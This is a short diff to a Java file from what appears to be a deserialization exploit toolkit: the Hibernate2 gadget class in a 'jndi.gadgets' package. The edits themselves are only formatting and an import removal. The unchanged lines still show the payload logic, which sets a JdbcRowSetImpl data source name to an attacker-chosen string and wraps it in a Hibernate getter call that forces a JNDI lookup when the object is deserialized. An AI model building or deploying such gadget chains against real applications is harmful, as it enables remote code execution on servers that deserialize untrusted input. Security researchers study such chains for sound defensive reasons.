@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.sun.rowset.JdbcRowSetImpl;
@@ -35,7 +34,7 @@ import com.sun.rowset.JdbcRowSetImpl;
  * @author mbechler
  */
 @Authors({Authors.MBECHLER})
-public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies{
+public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
 
     public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAtLeast(7);
@@ -46,7 +45,7 @@ public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies{
     }
 
     public Object getObject(String command) throws Exception {
-        
+
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(command);
         return Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
